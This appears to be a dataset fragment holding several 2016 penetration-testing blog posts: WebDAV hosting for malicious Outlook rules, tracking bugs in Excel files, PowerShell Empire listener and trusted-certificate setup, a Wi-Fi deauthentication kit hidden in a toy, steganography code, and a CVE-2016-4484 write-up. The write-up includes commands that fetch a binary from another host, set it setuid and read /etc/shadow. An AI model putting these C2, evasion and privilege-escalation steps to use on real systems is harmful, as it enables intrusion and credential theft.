        "output": "Title: \"Deploying a WebDAV Server\"\nTaxonomies: \"Red Team, Red Team Tools, Digital Ocean, Outlook, OWA, webDAV\"\nCreation Date: \"Wed, 09 Nov 2016 20:41:12 +0000\"\nCarrie Roberts //\n\nThere are various reasons why having a webDAV server comes in handy. The main reason I created one was to execute a malicious Outlook rule attack as part of a pentest as described here. In my case, I configured the webDAV server to be read-only so that my executables do not get erroneously or maliciously overwritten. These instructions are for deploying a webDAV server on a Digital Ocean instance, but similar steps would be used for other cloud providers.\n\nHere we go!\nCreate and then sign into your Digital Ocean account at https://www.digitalocean.com/. For improved security, enable two-factor authentication on your account.\nClick on the \"Create Droplet\" button at the top of the page.\n\nClick \"Create Droplet\" in Digital Ocean\nChoose the default Ubuntu release (at the time of writing this was 16.04.1), and the cheapest server option, as shown in the images below. Accept other defaults and add your SSH key for logging into your new server. Optionally, set a hostname for your server. Finally, click the big green \"Create\" button at the bottom of the page to create your instance.\n \n \nDigital Ocean Droplet Creation Options\nThat was easy! Now you have a server deployed on the internet.\n\nSuccessfully Created Digital Ocean Instance (aka Droplet)\nFirst, let's do some housekeeping on our new instance. Connect to your new instance like so:\n\nSSH Access to Server\nDisable the ability to SSH to your server using a password so that SSH access requires your private key. Edit the file at etc/ssh/sshd_config by uncommenting the \"PasswordAuthentication\" line and setting the value to \"no\":\n\nDisable SSH Access via Password\nThen, restart the SSH service so that your changes take effect.\n\nSSH Configuration Edit and Service Restart\nYou can verify that SSH access via password has been disabled by trying to SSH from a server that does not have your private key, as shown below. The first attempt was made before the configuration change and prompts the user to enter their password. The second attempt simply denies the user access.\n\nConfirm SSH Key Access Only\nUpdate your server with the following two commands (repeat this often to keep the system up to date):\napt-get update\n\napt-get dist-upgrade\nInstall Apache with the following command:\napt-get install apache2\nEnable Apache webDAV functionality:\na2enmod dav\n\na2enmod dav_fs\n\nEnable Apache WebDAV Modules\nCreate a webdav directory at /var/www and set www-data as the owner.\n\nCreate WebDAV Directory and Set Owner\nConfigure Apache for read-only access to files in the webdav directory by editing your /etc/apache2/sites-available/000-default.conf file to match the following (comments removed for brevity):\n *:80>\n\n        ServerAdmin webmaster@localhost\n\n        DocumentRoot /var/www/html\n\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n  Alias /webdav /var/www/webdav\n\n   /webdav>\n\n    Options Indexes\n\n    DAV On\n\n    GET HEAD OPTIONS PROPFIND>\n\n      Deny from all\n\n    \n\n    Satisfy all\n\n  \n\nRestart Apache and visit your new webDAV server from a web browser at: http:///webdav/\n\nCommand to Restart Apache\n\nInitial WebDAV Directory Listing\nCongratulations, you now have a webDAV server!.  Now, put some files in there you would like to access. A simple example is given below.\n\nRefresh your web browser to see the file listing.\n\nWebDAV Directory Listing and File Access\nThe interesting thing about a webDAV server is that you can access the files from File Explorer by entering the network address as follows:\n\\\\159.203.131.191\\webdav\n\nAccess WebDAV Files Through Windows File Explorer\nBe patient, as it takes a bit of time to load the directory listing after entering the network address. Attempting to open one of these files from the File Explorer gives the following error:\n\nFile Permission Error Blocks File Open\nThis is due to a file permission error because file ownership belongs to \"root\" instead of the \"www-data\" user under which Apache runs.\n\nTest Files Owned by Root (Causes Permission Error)\nTo fix the permission issue, change the ownership of the files as shown below:\n\nTest File Ownership Changed to www-data\nThe test file can now be opened by clicking on the link in File Explorer.\n\nTest File Opened from WebDAV Server via File Explorer\nForgetting to properly set the file permissions will foil your malicious Outlook rule attempt! The image below shows an example of the pop-up the user will get when the Outlook rule attempts to fire when the permissions on the WebDAV server are not correct.\n\nOutlook Rule Error with Incorrect File Permission on WebDAV Server\nIn addition, your Malicious Outlook Rule will be automatically disabled as indicated by the red text and no check mark in the check box.\n\nAutomatically Disabled Rule on Error\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Steganography: The Art and Science of Hiding Things in Other Things  Part 4\"\nTaxonomies: \"How-To, hiding things in other things, images, steganography\"\nCreation Date: \"Fri, 11 Nov 2016 16:07:34 +0000\"\nDakota Nelson* //\n\nPart 4: Resilient Steganography\nThis is it. The end. The last of a four part series covering image steganography. You can get started with part 1, part 2, or part 3, or dive right in below:\nWe\u2019ve covered the basics of hiding data in images. We\u2019ve covered the math. We\u2019ve covered error detection and correction using hamming codes. There have been Venn diagrams, and puppies, and secret messages, and it\u2019s all been very exciting.\nWhere do we end?\nWith code, of course! We\u2019ll tie everything together, slap a nice bow on it, write some documentation, and declare our steganography project complete. I left you after part 3 with a bunch of math about error correcting codes, and a promise to put that math to work, and that\u2019s exactly what we\u2019ll do - steganographically hide data which we\u2019ve run through a hamming encoder so that we can correct errors caused by compression (or anything else).\nAll of the code for this article can be found on Github - I\u2019ll walk you through it below, but you can always go take a look for yourself.\nLet\u2019s get started.\nWhen you read part 2, we covered the Python code used to steganographically insert data into images. The final steganography software, in Python, which does this is the same as before (except slightly cleaned up), so I\u2019ll skip over a full explanation of it. As a refresher - the least significant bits of each pixel in the image are basically random, so we can change them to whatever we want and the image will look the same to a human observer. This code just flips the correct bits in order to output an image with our message in it.\nWhat happens, though, if the image is then compressed, or damaged in some way? In the last post, we walked through the math behind hamming codes, an error-correcting code that allows us to fix errors in our message. Here\u2019s the code that puts that math into action:\n    def encode(msg):\n\n        \"\"\" passed a list of bits (integers, 1 or 0), \n returns a hamming(8,4)-coded\n\n            list of bits \"\"\"\n\n        while len(msg) % 4 != 0:\n\n            # pad the message to length\n\n            msg.append(0)\n    \n\n        msg = np.reshape(np.array(msg), (-1, 4))\n\n        # create parity bits using transition matrix\n\n        transition = np.mat('1,0,0,0,0,1,1,1;\\\n\n                             0,1,0,0,1,0,1,1;\\\n\n                             0,0,1,0,1,1,0,1;\\\n\n                             0,0,0,1,1,1,1,0')\n\n    \n        result =  np.dot(msg, transition)\n\n        # mod 2 the matrix multiplication\n\n        return np.mod(result, 2)\nThis is some pretty dense code, so let\u2019s walk through it one piece at a time. First, we add zeros to the end of the message until it\u2019s the proper length so that the matrix multiplication will work out right (the number of bits in the message must be a multiple of 4).\nOnce the message is the right length, we create an nx4 array of the message\u2019s bits (where n is whatever it has to be to fit the whole message). This array is then multiplied by a transition matrix.\nHold up.\n\u201cMatrices,\u201d you say,  \u201cwhere did they come from? We haven\u2019t talked about any stinkin\u2019 matrices.\u201d\nWell, astute reader, you caught me. I didn\u2019t mention the matrices, and I\u2019m going to mostly ignore them here, except to say this: remember when we had to count up the number of bits in each circle of the Venn diagram and then create a parity bit for each group based on what the data bits were? That\u2019s what this matrix does. We multiply the message by this hamming code matrix, then mod the result by two (that is, take the remainder of each entry in the resulting array divided by 2) and we have ourselves a hamming-encoded message.\n(If you still don\u2019t like me not explaining the matrix multiplication, here\u2019s the mathy version: the left half of the matrix is the identity matrix (preserving our original message), while the right half\u2019s columns are entirely linearly independent from each other such that every generated parity bit is based on 3 data bits with no redundancy in parity. Given 4 bits of data, this matrix outputs 8 bits of \u201cdata plus parity,\u201d known to error correcting code people as a codeword.)\nNow that we\u2019ve got a hamming-encoded message that will tolerate some errors, we insert it into an image, as usual, exactly how we\u2019ve discussed in previous posts. We then extract it on the other end - again, as usual. The mechanics of actual steganography should be pretty familiar to you by now. (If not, go back and read part 2 for a discussion of image steganography techniques.)\nOnce we\u2019ve retrieved our message from the image that our steganography algorithm put it into, how do we fix errors? That\u2019s the whole point of this hamming error correction code thing, after all.\nIt turns out that the answer is more matrices. This next piece of code acts as a hamming code decoder in three parts. We\u2019ll break each down individually.\n    def syndrome(msg):\n\n        \"\"\" passed a list of hamming(8,4)-encoded bits \n (integers, 1 or 0),\n\n            returns an error syndrome for that list \"\"\"\n\n    \n        msg = np.reshape(np.array(msg), (-1, 8)).T\n \n   # syndrome generation matrix\n\n        transition = np.mat('0,1,1,1,1,0,0,0;\\\n\n                             1,0,1,1,0,1,0,0;\\\n\n                             1,1,0,1,0,0,1,0;\\\n\n                             1,1,1,0,0,0,0,1')\n\n    \n\n        result = np.dot(transition, msg)\n\n    \n\n        # mod 2 the matrix multiplication\n\n        return np.mod(result, 2)\nThe first task is to calculate a syndrome for this hamming code. This error syndrome, as it\u2019s called, is basically a record of what\u2019s wrong with the message - much like the syndrome of a disease, it can tell us what\u2019s wrong with the message so we can tell how to apply our error corrections to fix it. The mechanics here are the same as the hamming encoding - get the array in the right shape, multiply with the proper hamming code syndrome matrix, then mod everything by 2.\n    def correct(msg, syndrome):\n\n        \"\"\" passed a syndrome and a message (as received, \n presumably with some\n\n            errors), will use the syndrome to correct the \n message as best possible\n\n        \"\"\"\n\n    \n\n        # the syndrome for any incorrect bit will match the \n column of the syndrome\n\n        # generation matrix that corresponds to the incorrect \n bit; a syndrome of\n\n        # (1, 1, 0, 1) would indicate that the third bit has \n been flipped, since it\n\n        # corresponds to the third column of the matrix\n\n    \n\n        # syndrome generation matrix (copy/pasted from above)\n\n        transition = np.mat('0,1,1,1,1,0,0,0;\\\n\n                             1,0,1,1,0,1,0,0;\\\n\n                             1,1,0,1,0,0,1,0;\\\n\n                             1,1,1,0,0,0,0,1')\n\n    \n\n        for synd in range(syndrome.shape[1]):\n\n            if not np.any(syndrome[:,synd]):\n\n                # all zeros - no error!\n\n                continue\n\n    \n\n            # otherwise we have an error syndrome\n\n            for col in range(transition.shape[1]):\n\n           # not very pythonic iteration, but we need the index\n\n       if np.array_equal(transition[:,col], syndrome[:,synd]):\n\n                    current_val = msg[synd,col]\n\n                    new_val = (current_val + 1) % 2\n\n                    msg.itemset((synd,col), new_val)\n\n    \n\n        return msg\nOnce we have a syndrome, we know how to correct the message. This code above matches each syndrome to the bit that needs to be flipped by comparing each error syndrome to the syndrome generation matrix from above. If we find a match, we flip the corresponding bit - if it doesn\u2019t match, we use the continue keyword to skip to the next iteration of the loop. \n   def decode(msg):\n\n        r = np.mat('1,0,0,0,0,0,0,0;\\\n\n                    0,1,0,0,0,0,0,0;\\\n\n                    0,0,1,0,0,0,0,0;\\\n\n                    0,0,0,1,0,0,0,0')\n\n    \n\n        res = np.dot(r, msg.T)\n\n    \n\n        # convert to a regular python list, which is a pain\n\n        return res.T.reshape((1,-1)).tolist()[0]\n    \nNow that we\u2019ve corrected our message, we can decode it! Using the decoding matrix above, we do the same ol\u2019 matrix multiplication in order to get our final message out.\nSo, what\u2019s the outcome of all this? Continuing our image steganography example from part 3, this is the final result:\nHere\u2019s our original message, with text on the right and the corresponding hex values on the left:\n[dnelson@blueharvest hamming-stego]$ xxd -s 7 -l 45 output.txt \n\n00000007: 7765 2772 6520 676f 696e 6720 746f 2068  \nwe're going to h\n\n00000017: 6964 6520 7468 6973 206d 6573 7361 6765  \nide this message\n\n00000027: 2069 6e20 616e 2069 6d61 6765 21          \nin an image!\nThis is the data after some errors have been inserted into it and it\u2019s been padding a little bit:\n[dnelson@blueharvest hamming-stego]$ xxd -s 70 -l 100 \noutput.txt \n\n00000046: 7765 2772 6520 656b 696e 6720 746f 2068  \nwe're eking to h\n\n00000056: 6964 6520 7468 6973 206d 6573 7361 6765  \nide this message\n\n00000066: 2069 6e20 616e 2069 6d61 6765 0100 0400   \nin an image....\n\n00000076: 0000 0000 0000 0000 0002 0000 0000 0000  \n................\n\n00000086: 0000 0000 0000 0000 0000 0000 0000 0000  \n................\n\n00000096: 0000 0800 0000 0000 0000 1000 0000 0000  \n................\n\n000000a6: 0000 0000                                \n....\n    And this is our final, corrected output:\n[dnelson@blueharvest hamming-stego]$ xxd -s 54765 -l 100 \noutput.txt \n\n0000d5ed: 7765 2772 6520 676f 696e 6720 746f 2068  \nwe're going to h\n\n0000d5fd: 6964 6520 7468 6973 206d 6573 7361 6765  \nide this message\n\n0000d60d: 2069 6e20 616e 2069 6d61 6765 2100 0000   \nin an image!...\n\n0000d61d: 0000 0000 0000 0000 0000 0000 0000 0000  \n................\n\n0000d62d: 0000 0000 0000 0000 0000 0000 0000 0000  \n................\n\n0000d63d: 0000 0000 0000 0000 0000 0000 0000 0000  \n................\n\n0000d64d: 0000 0000                                \n....\nThat\u2019s it - we corrected a message using a hamming code! Whereas before we had to repeat each character 9 times, this hamming code fits 4 bytes of data into each 8 byte code word - a 1:2 ratio of data to total instead of our 1:9 from before. A pretty sizable improvement!\nNote, however, that the error correction capabilities of a hamming code are only so good. The \u201cdamaged\u201d message up above is still pretty readable to a human - much more than that, and errors start to sneak through to the end. Maybe that\u2019s okay\u2026 but maybe it\u2019s not. As always, there are tradeoffs.\nWant to see the full image steganography example in action? Visit https://github.com/DakotaNelson/hamming-stego and check it out! That link heads straight to Github, where you\u2019ll find a free steganography tool in Python, usable on Linux, Mac, Windows, or anywhere else you can run Python.\nIf you\u2019d like a single PDF of this entire four part series, you can head over to the Striker Security Blog to download one.\n_____\n*Dakota runs Striker Security - you can find more of his writing at https://strikersecurity.com/blog\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bugging Microsoft Files: Part 2 - Xlsx Files using Microsoft Excel\"\nTaxonomies: \"Author, Ethan Robish, Red Team, Red Team Tools, Bugging Excel files, Bugging xlsx files, Colin Edwards, Excel, Microsoft Excel, microsoft office\"\nCreation Date: \"Mon, 14 Nov 2016 17:56:41 +0000\"\nEthan Robish //\n\nAs promised in my previous post, part 1, this post shows how to place a tracking bug in a native .xlsx file.  Full credit for this method goes to Colin Edwards (see link at end of post).\nThe instructions below were made with Microsoft Excel 2013 for Windows.\n\nOpen an existing document or create a new one. Choose the Data Menu.\nChoose From Web.\n\nType the address for your tracking bug. You should come up with a unique name for this document so when it is opened later you can tell which document it was. The address should be similar to http://DOMAIN/index.php?id=ID&type=img but you need to replace DOMAIN and ID with your own values. Choose Go to load the URL you entered.\nClick the tiny green arrow in the corner. This tells Excel what to read from the page. In this case, the page is blank so we choose the whole thing.\n\nChoose a cell to insert the data. It does not matter where as we will hide the whole sheet later.\nChoose Properties.\n\nCheck the box next to: Refresh the data when opening the file. This tells Excel to load the tracking bug every time the file is opened.\nChoose OK twice.\n\nYou will see data in the cell you chose. To hide this:\n\nChoose the + symbol to add a new sheet.\nRight-click the sheet where your tracking bug is.\nChoose Hide.\n\nYou may want to rename the remaining sheet to something more specific.\nSave the file and close Excel.\nWhen the spreadsheet is opened, Excel will not automatically trigger the tracking bug. Instead, it will prompt the user with a security message as shown here:\n\nChoosing Enable Content will trigger the tracking bug. Excel will remember this and not ask the next time the same user opens the same document.\nPart 1\nPart 3\nReference:\n\nhttps://icanthackit.wordpress.com/2016/04/22/web-bugs-in-native-excel-xlsx-files/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Script Startup of Empire Listeners\"\nTaxonomies: \"Red Team, Red Team Tools, Carrie Roberts, Empire commands, Empire Listeners, Listeners\"\nCreation Date: \"Fri, 18 Nov 2016 16:00:36 +0000\"\nCarrie Roberts //   \n\nTired of typing those Empire commands to startup your goto listeners? Wish there was an equivalent to Metasploit resource files for Empire? This is not currently implemented as far as I know, so until then here is a hack to make it happen. \n\nWhen I\u2019m working with tools on a remote server, which is always the case when I\u2019m using Empire, I always use the Linux screen tool. The biggest reason I use screen is so that my processes, such as Empire, do not quit if/when I get disconnected from the server.\n\nThe solution for scripting the startup of Empire Listeners given here utilizes a feature of screen. Some common and useful screen commands can be found in this guide.\n\nFirst, start a screen session, giving it a specific name. The following command creates a screen session named \u201cmy-screen\u201d and immediately enters the default window within the screen session.\n\n# screen -S my-screen\n\nEach screen session can contain many windows. We are currently interacting with the default screen. Let\u2019s rename this screen window to \u201cempire\u201d and start Empire in it. To rename this screen window use this key combination:\n\nCtrl-a A\n\nThis brings up a prompt at the bottom of the window where you can enter the new name:\n\nNow let\u2019s start Empire in this window. I\u2019ve got empire downloaded to the /root/Empire directory so I enter the following commands:\n\n# cd /root/Empire\n# ./empire\n\nWe will leave Empire running there and start-up another window within our screen session using the Ctrl-a c key combination.\n\nFrom here we create a bash script that uses a feature of Screen allowing us to send commands to particular windows within a session. The following is an example script, sending commands to start up an Empire listener with specific settings. The commands are sent to the screen session named \u201cmy-screen\u201d and the window named \u201cempire\u201d within that session.\n\nIn my case, I named the file above \u201c443\u201d. After creating the script I make it executable as follows and then ran it.\n\n# chmod +x 443\n# ./443\n\nNow switch back to your other screen window where Empire is running with the Ctrl-a space key combination to see the results.\n\nIn the future, all we need to do to start up our custom listener is run the 443 script using the \u201c./443\u201d command. You can create additional scripts for other ports and settings of your choice or combine them all to start up all of your listeners at once.  Do you have a better/easier way to accomplish this task? Please share and I\u2019ll update this post.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Weaponizing Princess Toys: Crafting Wi-Fi Attack Kits\"\nTaxonomies: \"Author, Fun & Games, Jordan Drysdale, Red Team, Wireless, Hand Crafted, hardware hacking, More Fun Projects, Princess Computer, Weaponizing Kids' Toys, Wi-Fi Attack Kits\"\nCreation Date: \"Wed, 16 Nov 2016 16:40:08 +0000\"\nJordan Drysdale // \n\n\u2026 Alternate Title: \"Why I Love BHIS\"\n\nSo, I was gifted this cute little princessy-toy thing recently. My first thought was that my daughters will love this thing. My second thought was \u201clet\u2019s turn this into a princess play thing, reverse SSH Kali hacker backdoor exploit kit with onboard ad-hoc Wi-Fi that I can connect to remotely via a directional Wi-Fi antenna for covert use in wireless and contractual engagements.\u201d\n\nParts list minus the directional antenna:\n\nI installed and Configured Kali for pi. Link here for RPi kali image. Assembled parts. I recommend reviewing Wired's Guide to Parenting on Wired (Gaffigan\u2019s stuff is hilarious BTW).\n\n(Editor's Note: We hope you'll notice how much awesome is going on in this photo!)\n\nIt was time to make the RPi fit inside the princessy-toy thing. I used a standard rotary tool and just started carving. I was able to craft a nifty little opening for a power port. I dropped in the screw port to keep the RPi in place once the unit is ready for action.\n\nBoom! I got power running of a solar cell. Corollary: This 10000 mAh cell gave me about 15 hours running time with an ad-hoc Wi-Fi cell, an external USB Wi-Fi adapter and Kismet running. Anker, the cell below is from PowerCell, but for actual use in the field, I went with the extremely low profile PowerCore+ mini [Amazon - 13 bucks].\n\nFinished product, bottom side. @ANKERofficial\n\nAnd yes, you darn right the thing still works!\n\nIn the next step I configured hostapd to broadcast an ad-hoc wireless cell on the RPi for remote connectivity. With the directional antenna, the theory goes something like this: \u201cPoint the directional antenna at the target. Connect the legally and contractually allowed laptop or VM to the ad-hoc cell. Run kismet off the USB dongle that @Hak5 sells. Capture 4 way handshake and let the cracker do the rest.\u201d This USB dongle works out of the box and has no issues with driver integration on Kali for RPi.\n\nhostapd configuration on RPi:\n\nWlan0 interface for ad-hoc Wi-Fi and the secondary wlan adapter for packet sniffing and injection:\n\nI sent one of the kids down the street with the new toy.\n\nHere was the living room rig for some initial testing.\n\nNow, from my really nice mountain ash tree post about twenty feet up, I had a bird\u2019s eye line of sight with the JoyLive yagi antenna of the daycare where my kids hang out when they get bored of my shenanigans. And who knew the little princess toy was ready to audit their home Wi-Fi networks?\n\n\u2026.had they not been previously advised.\n\nFrom the perch I have about a block or block and a half shot to the day care. I got a pretty decent signal, the real problem being the moving target.\n\nThis really happened.\n\nWireless info from the laptop. Note the super legit Tx-Power with that directional attached. 1000mW / 1W / FTWin!\n\nI went with the WAN ISP type network configuration, a /30 without DHCP services, which most of the articles that discussed hostapd included. Not bad for connectivity, you can see the dropped packets, but it was stable enough to connect.\n\nI launched Kismet (remember to launch from directory where you want output files created) and linked it with attached USB interface. Kismet is fun, but the real action is done in airmon-ng and airodump-ng.\n\nSide Note: I tested out a Kismet and Wi-Fi packet sniffing config with this device driving across South Dakota recently. I captured less than 25MB of SSID data. There are nine towns in the state and we are struggling with the new WAN drops out here. Most of the hardware we have at the BHIS offices is still on dial-up and token ring. Anyway, since there are less people in this whole state than a city block anywhere east of the Mississippi river, we\u2019ve had some wireless adoption delays. We\u2019re still trying though!\n\nAnyway, I launched and killed Kismet, and as usual, it leaves behind a \u2018mon\u2019 interface...used that with airmon-ng instead and sent off the deauth packets.\n\nWith airmon-ng running in the background, I fired up another console and launched airodump-ng with the packet destination.\n\nDeauth someone at the daycare facility.\n\nRock and Roll! I snagged a handshake.\n\nGreat Successes! Handshake complete, hashes off to the Nvidia Grid GPU EC2 instance for further investigations. Or, for brevity\u2019s sake, check out my test run against a pre-fab dictionary file:\n\nNext up, looking at a couple different things\u2026.but, our good friend Delta Charlie has us all talking about remotely controlling modified kids toys via SDR to run surveillance!\n\nCheck out this rig!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Two Button PWNage\"\nTaxonomies: \"Blue Team, Red Team, DeepSec16, encryption, enter key, enter sesame, Linux, LUKS\"\nCreation Date: \"Thu, 17 Nov 2016 17:15:54 +0000\"\nLogan Lembke //\n\nStep One: Power. Step Two: Enter. Step Three: ???? Step Four: Profit.\nIn the security industry, we love our encryption. However sometimes, the complexity introduced by encryption can bite us down the road. A serious case of this was announced last Friday (November 11th) at DeepSec 2016 in Vienna.\nCVE-2016-4484: After powering on most Linux computers with hard drive encryption enabled (LUKS), you can make your way into a root shell by simply holding down the enter key.\nAlright that sounds bad, and it is. However, the shell you are presented with is severely stripped down, and the encrypted disks remain encrypted. Thankfully, this means a would-be attacker would not be able to access most of the data on the system.\nHowever, the authors of the finding, Hector Marco and Ismael Ripoll, are quick to point out that the vulnerability is still useful for nefarious activities such as\nElevation of privilege: Since the boot partition is typically not encrypted:\nIt can be used to store an executable file with the bit SetUID enabled. Which can later be used to escalate privileges by a local user.\nIf the boot is not secured, then it would be possible to replace the kernel and the initrd image.\nInformation disclosure: It is possible to access all the disks. Although the system partition is encrypted it can be copied to an external device, where it can be later be brute forced. Obviously, it is possible to access non-encrypted information in other devices.\nDenial of service: The attacker can delete the information on all the disks.\n(Quoted from http://hmarco.org/bugs/CVE-2016-4484/CVE-2016-4484_cryptsetup_initrd_shell.html)\nHow do I fix the issue?\nSadly, this bug occurs in several different code bases, making it harder to remedy. On Debian based systems, this problem exists in the cryptsetup package, and on RHEL based systems, the problem lies in the dracut package. At the time of this writing, I have not heard whether or not mkinitcpio based systems are affected.\nOn Debian based systems, the error is caused by an off by one error in the cryptroot shell script which is packaged with cryptsetup. Marco and Ripoll explain the error here. (link to http://hmarco.org/bugs/CVE-2016-4484/CVE-2016-4484_cryptsetup_initrd_shell.html) An official patch has been rolled out to Debian\u2019s unstable and testing repositories, but the patch has not been pushed through to the stable branch. Additionally, Ubuntu has yet to push through a patch to any of their repositories.\nWhile you wait for the official patch, you can protect your system running the following script based on the fix suggested by Marco and Ripoll.\nCVE-2016-4484-Debian-Fix\n#!/bin/sh\n\nperl -i -lpe '\n\nif (/^[\\s]+count=0/){\n\n        print \"\\tsuccess=0\";\n\n};\n\nif (/^[\\s]+message \"cryptsetup: \\$crypttarget set up successfully\"/){\n\n        print \"\\t\\tsuccess=1\";\n\n};\n\n' /usr/share/initramfs-tools/scripts/local-top/cryptroot\n\nperl -i -0777 -pe '\n\ns/[\\s]+if \\[ \\$crypttries -gt 0 \\] && \\[ \\$count -gt \\$crypttries \\];\n\nthen[\\s]+message \"cryptsetup: maximum number of tries exceeded for\n\n\\$crypttarget\"[\\s]+return 1/\\n\\tif [ \\$success -eq 0 ];\n\nthen\\n\\t\\tmessage \\\"cryptsetup: Maximum number of tries exceeded. \nPlease\n\nreboot.\\\"\\n\\t\\twhile true; do\\n\\t\\t\\tsleep 100\\n\\t\\tdone/\n\n' /usr/share/initramfs-tools/scripts/local-top/cryptroot\n\nupdate-initramfs -u\nUnfortunately, I cannot provide a fix for dracut on RHEL based systems. Dracut is an event based tool used to generate the initial ram disk used when booting up your Linux system, and I am not very familiar with its code base. However, the fix is likely to be simple, but after looking through the code, I did not quickly notice how to fix it.\nIn the meantime, checkout the progress being made on official patches here:\nDebian: https://packages.qa.debian.org/c/cryptsetup.html\nUbuntu: https://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-4484.html \nRHEL: https://access.redhat.com/security/cve/cve-2016-4484\nDracut: http://git.kernel.org/cgit/boot/dracut/dracut.git/ \n\nTime to get to work!\nWho cares about a vulnerability which requires physical access?\nWhile exploiting this vulnerability requires physical access, it is still lethal in a virtual environment. Imagine an attacker is stalking your hypervisor. With this vulnerability, the attacker has an easy way to elevate their privileges on an encrypted virtual machine.\nThe attacker waits until the virtual machine is powered off, jumps into the root shell, mounts the unencrypted boot partition, loads some programs onto it, sets the sticky bit on the programs, shuts down the virtual machine, and waits until someone logs back into it. Now, all the attacker has to do is run the programs they loaded into the boot partition in order to obtain root access.\nThe commands used to execute this attack would look something like this:\n##Drop into the shell using CVE 2016 4484\n\n#Mount the boot partition\n\nmkdir /boot\n\nmount /dev/sda1 /boot\n\n#Set up an ip address to receive executables\n\n#Note: the busybox executables included in the initramfs do not \nwork with the sticky bit\n\nip address add 192.168.0.74/24\n\nifconfig ens33 up\n\n#Serve up /usr/bin on another computer (192.168.0.100/24)\n\n#Download nano to the boot partition\n\ncd /boot\n\nwget 192.168.0.100/nano\n\n#Set the sticky bit\n\nchmod 4755 nano\n\n#Shutdown\n\ncd ..\n\numount /dev/sda1\n\npoweroff\n\n#Wait and obtain access to an underprivileged account\n\n/boot/nano /etc/shadow\n\n#WIN.\nNote: This was tested using Ubuntu Server 16.04.  Fedora 24 does not seem to be vulnerable to this attack without some finagling, since chmod is not included in the dracut shell by default. However, dracut does include vi by default, which should be susceptible to the sticky bit attack.\nHow do we prevent these types of vulnerabilities?\nThe code in question concerning this vulnerability is all open source. There simply weren\u2019t enough critical readers reviewing the code. As users of these immensely popular projects, we owe it to ourselves to occasionally participate in the code review process. It wasn\u2019t only the contributors to these projects who failed. We failed. Next time you\u2019re using a piece of technology critical to your business or daily habits, check if the source code is available for it. Skim through it. See if you can catch a bit of the ingenuity that went into creating it. If you don\u2019t understand a lick of code, check out the wiki and bug trackers for the projects.  Too often we take software for granted, and we howl when vulnerabilities like this come out of the woodwork.\nLearn more about CVE-2016-4484 at the official disclosure.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bugging Microsoft Files: Part 3  Clearing Metadata\"\nTaxonomies: \"Author, Ethan Robish, Red Team, Red Team Tools, author metadata, bugging documents, how to clear metadata, Microsoft, MS Excel, MS Word\"\nCreation Date: \"Mon, 21 Nov 2016 14:41:53 +0000\"\nEthan Robish //\n\nIn my last two posts I showed how to insert tracking bugs in both .docx (Part 1) and .xlsx files (Part 2).  But don\u2019t let all that effort go to waste by leaving metadata in that could lead back to you.\nWhen you save a file in Microsoft Office some metadata about you is stored, such as the author name. Choose the File->Info menu and you can see what value is set as the author. If it is something generic or purposely misleading you may wish to leave it as-is.\nThe instructions below were made with Microsoft Office 2013 for Windows.\n\nAuthor Metadata\nHowever, if you want to clear the data this is how.\n\nCheck for Issues\n\nFrom the File->Info menu, click Check for Issues\nChoose Inspect Document.\n\nDocument Inspector\n\nChoose Inspect in the dialog window that appears.\n\nDocument Inspector Author\n\nChoose Remove All next to Document Properties and Personal Information.\n\nDocument Inspector Headers\nScrolling down, you may see other items with Remove All buttons next to them. Use your discretion on which ones to remove but keep in mind where you stored your tracking bug. In this case, I put it in the document header so it makes sense that the Document Inspector is showing that there is a header. I will choose to leave this there since I know all it contains is the tracking bug.\n\nDocument Inspector Hidden Sheets\nThis is an example from an Excel spreadsheet where the tracking bug is in a hidden sheet. This is another place where you would not remove it.\n\nOnce you exit the Document Inspector, verify that the author metadata was removed.\nPart 1\nPart 2\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Using PowerShell Empire with a Trusted Certificate\"\nTaxonomies: \"External/Internal, Red Team, Carrie Roberts, Let's Encrypt, PowerShell, PowerShell Empire, Trusted Certificate\"\nCreation Date: \"Wed, 23 Nov 2016 14:46:07 +0000\"\nCarrie Roberts* // \n\nUsing a trusted certificate and non-default Empire options will help increase your chances of getting a successful session out of a network. Follow these instructions to get setup.\n\nFirst, get a signed digital certificate for your server using Let's Encrypt.\n\nVisit https://certbot.eff.org/ for instructions. The process is also shown here for Apache running on Debian. First, select your server software and Operating system, in this case, Apache and Debian 8.\n\n Certbot Start Page \n\nAdd the Jessie Backports Repo to your sources.list file ( /etc/apt/sources.list in this case) by adding the following line:\n\ndeb http://ftp.debian.org/debian jessie-backports main\n\nThen update with this command:\n\nsudo apt-get update\n\nInstall the Certbot package:\n\nsudo apt-get install python-certbot-apache -t jessie-backports\n\nRun the apache plugin:\n\nsudo certbot --apache\n\nThis will prompt you to answer some questions. Note that you will be required to have a domain name pointing to your server (they are cheap, just buy one) because Let\u2019s Encrypt will not issue certificates for bare IP addresses. Alternatively, you could use a self-signed certificate as described here, https://attackerkb.com/Powershell/Powershell_Empire, which would not require a domain name.\n\n Successful Setup via Let's Encrypt \n\nNow combine your cert.pem and privkey.pem into the same file for use with Empire (Thanks Joff)\n\ncd /etc/letsencrypt/live/\ncp privkey.pem empire-priv.key\ncat cert.pem chain.pem > empire-chain.pem \n\nStop Apache so that ports 80 and 443 are available for your Empire listener:\n\nservice apache2 stop   \n\nWithin Empire, use options similar to the following. Note that changing the jitter and default profile is in an attempt to avoid detection of the session and increase chances that you will get a successful session (Thanks Derek)\n\nuselistener http \nset Name 443\nset Port 443\nset DefaultJitter 0.7\nset CertPath /etc/letsencrypt/live//\nset Host https:// \nset DefaultProfile /admin/login.php,/console/dashboard.asp,/news/today.jsp| Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; \nexecute\n\nNote: For hints on scripting the startup of your listener see here - https://www.blackhillsinfosec.com/how-to-script-startup-of-empire-listeners/.\n\nYou now have an HTTPS listener on port 443. You can generate a PowerShell command to run on the victim to establish a session with the following Empire commands:\n\nback\nusestager multi/launcher 443\nexecute \n\n Using the Empire Launcher \n\nCopy and paste the big long PowerShell command into cmd.exe on your victim to establish the session over HTTPS with a trusted certificate. 